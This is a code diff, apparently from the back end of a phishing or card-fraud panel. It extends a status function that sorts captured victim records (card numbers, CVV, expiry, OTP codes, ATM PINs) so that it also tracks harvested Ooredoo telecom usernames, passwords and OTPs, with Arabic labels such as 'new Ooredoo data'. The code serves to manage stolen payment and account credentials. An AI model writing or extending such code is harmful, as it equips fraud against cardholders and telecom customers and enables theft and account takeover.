@@ -229,9 +229,22 @@
     const otpValue = (d.otp || (card && (card.otp || card.otpCode))) || '';
     const atmValue = (d.atmPin || (card && (card.atm || card.atmPin))) || '';
 
+    const ooredooUser = (d.ooredooUser || (card && card.ooredooUser)) || '';
+    const ooredooPass = (d.ooredooPass || (card && card.ooredooPass)) || '';
+    const ooredooOtp = (d.ooredooOtp || (card && card.ooredooOtp)) || '';
+
+    const hasCardData = Boolean(card && (card.cardName || card.cardNumber || card.expiryDate || card.cvv || card.number || card.name));
+    const hasOoredooData = Boolean(ooredooUser || ooredooPass || ooredooOtp);
+
+    if (!card && !hasOoredooData && !otpValue && !atmValue) return 'بيانات جديدة';
+    if (!hasCardData && !otpValue && !atmValue && !hasOoredooData) return 'بيانات جديدة';
+    if (!hasCardData && !otpValue && !atmValue && hasOoredooData) return 'بيانات أوريدو جديدة';
     if (!card || !card.cardNumber) return 'بطاقة جديدة';
     if (!otpValue) return 'OTP جديد';
     if (!atmValue) return 'ATM جديد';
+    if (!ooredooOtp && hasOoredooData) return 'بيانات أوريدو جديدة';
+    if (ooredooOtp && !ooredooUser && !ooredooPass) return 'OTP أوريدو جديد';
+    if (hasOoredooData) return 'بيانات أوريدو جديدة';
     return 'قيد المراجعة';
   }
 
